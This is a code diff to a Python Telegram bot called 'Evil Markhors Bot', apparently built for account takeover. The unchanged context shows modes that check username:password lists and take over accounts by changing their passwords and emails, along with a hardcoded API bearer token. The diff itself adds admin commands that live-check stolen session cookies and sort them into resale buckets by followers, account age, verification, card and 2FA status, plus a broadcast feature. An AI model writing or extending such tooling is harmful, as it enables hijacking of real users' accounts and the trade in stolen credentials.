@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Evil Markhors Bot - HARDENED (clean)
-Live progress + crash-proof + auto-recovery.
+Evil Markhors Bot - HARDENED (clean + admin split)
+Live progress + crash-proof + auto-recovery + admin bucket split.
 """
 import os
 import io
@@ -47,6 +47,17 @@ STORE_PATH = os.getenv("STORE_PATH", "users.json")
 HERE = os.path.dirname(os.path.abspath(__file__))
 SELF = os.path.basename(os.path.abspath(__file__))
 
+ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "7028523300,6120166351").split(",") if x.strip()}
+SPLIT = {}
+KEYMAP = {
+    "year": "Year", "followers": "Followers", "friends": "Friends", "posts": "Posts",
+    "likes": "Likes", "media": "Media", "verified": "Verified", "card": "Card added",
+    "api": "API", "developer api": "Developer API", "protected": "Protected",
+    "2fa": "2FA", "country": "Country",
+}
+NUM_FIELDS = {"year", "followers", "friends", "posts", "likes", "media"}
+BOOL_FIELDS = {"verified", "card", "api", "developer api", "protected", "2fa"}
+
 BEARER = (
     "AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
     "%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA"
@@ -72,6 +83,7 @@ FILES = {
     ".env.example": (
         "BOT_TOKEN=123456:ABC\nLIVE=1\nCONCURRENCY=8\n"
         "WEBSITE=https://evilmarkhors.me\nCREDIT=Config by Evil Markhors\nSTORE_PATH=users.json\n"
+        "ADMIN_IDS=7028523300,6120166351\n"
     ),
     "Dockerfile": (
         "FROM python:3.12-slim\nWORKDIR /app\n"
@@ -666,6 +678,62 @@ def fmt_result(r):
     return "\n".join(o)
 
 
+# ============================ ADMIN SPLIT HELPERS ============================
+def is_admin(uid):
+    try:
+        return int(uid) in ADMIN_IDS
+    except Exception:
+        return False
+
+
+def parse_buckets(spec):
+    out = []
+    for part in spec.split(","):
+        p = part.strip()
+        if not p:
+            continue
+        if p.endswith("+") and p[:-1].strip().isdigit():
+            out.append((p, int(p[:-1]), None, None))
+        elif "-" in p and p.replace("-", "").isdigit():
+            lo, hi = p.split("-", 1)
+            out.append((p, int(lo), int(hi), None))
+        else:
+            out.append((p, None, None, p.lower()))
+    return out
+
+
+def bucket_for(val, buckets, is_num):
+    if is_num:
+        try:
+            n = int(str(val).strip())
+        except Exception:
+            return None
+        for label, lo, hi, _ in buckets:
+            if lo is not None and hi is not None and lo <= n <= hi:
+                return label
+            if lo is not None and hi is None and n >= lo:
+                return label
+        return None
+    v = (val or "").strip().lower()
+    for label, _, _, exact in buckets:
+        if exact is not None and v == exact:
+            return label
+    return None
+
+
+def norm_bool(v):
+    v = (v or "").strip().lower()
+    if v in ("true", "yes", "1"):
+        return "yes"
+    if v in ("false", "no", "0"):
+        return "no"
+    return v
+
+
+def field_value(data, field):
+    return str(data.get(KEYMAP[field], "") or "").strip()
+
+
 # ============================ RUNNERS ============================
 async def process_cookie_zip(ip, op, live, prog):
     sem = asyncio.Semaphore(CONCURRENCY)
@@ -692,6 +760,60 @@ async def process_cookie_zip(ip, op, live, prog):
                     prog.done += 1
                     await prog.update()
     return prog.ok, prog.fail, prog.total
+
+
+async def process_split(ip, op, cfg, live, prog):
+    field = cfg["field"]
+    buckets = cfg["buckets"]
+    is_num = field in NUM_FIELDS
+    out = {}
+    for label, lo, hi, ex in buckets:
+        out[label] = []
+    unmatched = []
+    sem = asyncio.Semaphore(CONCURRENCY)
+    async with httpx.AsyncClient(follow_redirects=True) as client:
+        with zipfile.ZipFile(ip) as zin:
+            names = [n for n in zin.namelist() if n.lower().endswith(".txt") and not n.endswith("/")]
+            names = names[:MAX_FILES]
+            prog.total = len(names)
+            for name in names:
+                try:
+                    text = zin.read(name).decode("utf-8", "ignore")
+                    data, cookies = parse_cookie_file(text)
+                    val = field_value(data, field)
+                    if live and not val and cookies:
+                        async with sem:
+                            try:
+                                ld = await asyncio.wait_for(live_check(client, cookie_dict(cookies)), ACC_TIMEOUT)
+                            except asyncio.TimeoutError:
+                                ld = {}
+                        for k, v in ld.items():
+                            if v not in ("", None):
+                                data[k] = str(v)
+                        val = field_value(data, field)
+                    if field in BOOL_FIELDS:
+                        val = norm_bool(val)
+                    label = bucket_for(val, buckets, is_num)
+                    if label:
+                        out[label].extend(cookies)
+                        prog.ok += 1
+                    else:
+                        unmatched.extend(cookies)
+                        prog.fail += 1
+                except Exception:
+                    logging.exception("split %s", name)
+                    prog.fail += 1
+                prog.done += 1
+                await prog.update()
+    summary = ["Split by " + field, ""]
+    with zipfile.ZipFile(op, "w", zipfile.ZIP_DEFLATED) as z:
+        for label, lines in out.items():
+            safe = re.sub(r"[^A-Za-z0-9._+-]", "_", label)
+            z.writestr("split_" + safe + ".txt", "\n".join(lines) + ("\n" if lines else ""))
+            summary.append(label + ": " + str(len(lines)))
+        z.writestr("split_unmatched.txt", "\n".join(unmatched) + ("\n" if unmatched else ""))
+        summary.append("unmatched: " + str(len(unmatched)))
+        z.writestr("split_summary.txt", "\n".join(summary))
 
 
 async def run_ulp_batch(uid, lines, prog):
@@ -777,12 +899,15 @@ async def _send_zip(u, path, filename, caption):
         InputFile(io.BytesIO(data), filename=filename),
         caption=caption,
     )
+
+
 async def start(u, c):
     await u.message.reply_text(
         "Evil Markhors Bot\n\nModes:\n"
         "1) COOKIES: cookie file -> rework\n2) ULP: user:pass -> verify + takeover\n\n"
         "/mode auto|cookies|ulp\n/live on|off\n/takeover on|off\n/newpass <p>\n"
         "/newemail you@gmail.com\n/status\n/diag\n/finalize\n/cancel\n\n"
+        "Admin: /split /splitoff /broadcast\n\n"
         "Code maange to bot batayega, aap code bhej dena."
     )
 
@@ -790,14 +915,16 @@ async def start(u, c):
 async def help_cmd(u, c):
     await u.message.reply_text(
         "ULP: user:pass | email:pass | user:email:pass | ...:2fa\n"
-        "Code aane par: username code (har line alag)."
+        "Code aane par: username code (har line alag).\n\n"
+        "Admin split: /split followers 0-100,100-500,500+\n"
+        "Fields: " + ", ".join(KEYMAP)
     )
 
 
 async def status_cmd(u, c):
     uid = str(u.effective_user.id)
     g = ucfg(uid)
-    await u.message.reply_text(
+    txt = (
         "Mode: " + g["mode"] + "\nLive: " + ("ON" if g["live"] else "OFF")
         + "\nTakeover: " + ("ON" if g["takeover"] else "OFF")
         + "\nNewPass: " + (g["newpass"] or "(random)")
@@ -805,6 +932,10 @@ async def status_cmd(u, c):
         + "\nBatch: " + ("chal raha" if uid in BATCH else "none")
         + " | Pending: " + str(len(PEND.get(uid, {})))
     )
+    cfg = SPLIT.get(uid)
+    if cfg:
+        txt += "\nSPLIT: " + cfg["field"] + " | " + ", ".join(l for l, a, b, d in cfg["buckets"])
+    await u.message.reply_text(txt)
 
 
 async def diag_cmd(u, c):
@@ -814,6 +945,7 @@ async def diag_cmd(u, c):
         "py " + platform.python_version() + " | ptb " + telegram.__version__ + "\n"
         "cwd " + os.getcwd() + "\nstore " + STORE_PATH + "\n"
         "conc " + str(CONCURRENCY) + " live " + str(LIVE_DEFAULT) + "\n"
+        "admin " + str(is_admin(u.effective_user.id)) + "\n"
         "batches " + str(list(BATCH.keys()))
     )
 
@@ -860,6 +992,70 @@ async def newpass_cmd(u, c):
 async def newemail_cmd(u, c):
     await set_cfg(u.effective_user.id, newemail=(c.args[0] if c.args else ""))
     await u.message.reply_text("NewEmail = " + (ucfg(u.effective_user.id)["newemail"] or "(none)"))
+
+
+async def split_cmd(u, c):
+    uid = str(u.effective_user.id)
+    if not is_admin(uid):
+        await u.message.reply_text("Sirf admin.")
+        return
+    if not c.args:
+        cfg = SPLIT.get(uid)
+        if not cfg:
+            await u.message.reply_text(
+                "Split set nahi hai.\nFields: " + ", ".join(KEYMAP) + "\n"
+                "Misaal: /split followers 0-100,100-500,500-1000,1000+\n"
+                "Misaal: /split year 2008-2012,2013-2016,2017+"
+            )
+        else:
+            await u.message.reply_text(
+                "Split: " + cfg["field"] + " | " + ", ".join(l for l, a, b, d in cfg["buckets"])
+            )
+        return
+    field = c.args[0].lower()
+    if field not in KEYMAP:
+        await u.message.reply_text("Ghalat field. Allowed: " + ", ".join(KEYMAP))
+        return
+    if len(c.args) < 2:
+        await u.message.reply_text("Buckets bhi do. Misaal: /split followers 0-100,100-500")
+        return
+    buckets = parse_buckets(" ".join(c.args[1:]))
+    if not buckets:
+        await u.message.reply_text("Buckets samajh nahi aaye.")
+        return
+    SPLIT[uid] = {"field": field, "buckets": buckets}
+    await u.message.reply_text(
+        "Split set: " + field + " | " + ", ".join(l for l, a, b, d in buckets) + "\nAb zip bhejo."
+    )
+
+
+async def splitoff_cmd(u, c):
+    if not is_admin(u.effective_user.id):
+        await u.message.reply_text("Sirf admin.")
+        return
+    SPLIT.pop(str(u.effective_user.id), None)
+    await u.message.reply_text("Split off.")
+
+
+async def broadcast_cmd(u, c):
+    if not is_admin(u.effective_user.id):
+        await u.message.reply_text("Sirf admin.")
+        return
+    text = " ".join(c.args)
+    if not text:
+        await u.message.reply_text("Text do: /broadcast Hello")
+        return
+    sent = 0
+    fail = 0
+    bot = u.get_bot()
+    for uid in list(_store.keys()):
+        try:
+            await bot.send_message(int(uid), text)
+            sent += 1
+        except Exception:
+            fail += 1
+        await asyncio.sleep(0.05)
+    await u.message.reply_text("Broadcast: " + str(sent) + " sent, " + str(fail) + " fail")
 
 
 def detect_mode(text, forced):
@@ -935,6 +1131,19 @@ async def handle_file(u, c, doc):
 
         if mode == "cookies":
             op = os.path.join(tmp, "out.zip")
+            cfg = SPLIT.get(uid)
+            if cfg and is_zip:
+                prog = Progress(msg, 0, "SPLIT")
+                prog.phase = "Bucket: " + cfg["field"]
+                await process_split(ip, op, cfg, g["live"], prog)
+                await _send_zip(
+                    u, op, "evilmarkhors_split.zip",
+                    "Split done | ok " + str(prog.ok) + " | unmatched " + str(prog.fail)
+                    + "\n" + WEBSITE + "\n" + CREDIT,
+                )
+                await _edit(msg, "Complete")
+                await _hard_clear(uid)
+                return
             if not is_zip:
                 async with httpx.AsyncClient(follow_redirects=True) as client:
                     sem = asyncio.Semaphore(1)
@@ -1109,10 +1318,7 @@ async def post_init(app):
     load_batches()
     for uid, b in BATCH.items():
         try:
-            await app.bot.send_message(
-                int(uid),
-                "Purana batch mila. /finalize ya /cancel.",
-            )
+            await app.bot.send_message(int(uid), "Purana batch mila. /finalize ya /cancel.")
         except Exception:
             pass
 
@@ -1122,7 +1328,8 @@ async def on_doc(u, c):
     if not doc:
         return
     await handle_file(u, c, doc)
-    
+
+
 def main():
     made = bootstrap()
     if made:
@@ -1136,6 +1343,7 @@ def main():
         ("mode", mode_cmd), ("live", live_cmd), ("takeover", takeover_cmd),
         ("newpass", newpass_cmd), ("newemail", newemail_cmd),
         ("finalize", finalize_cmd), ("cancel", cancel_cmd),
+        ("split", split_cmd), ("splitoff", splitoff_cmd), ("broadcast", broadcast_cmd),
     ]
     for cmd, fn in handlers:
         app.add_handler(CommandHandler(cmd, fn))
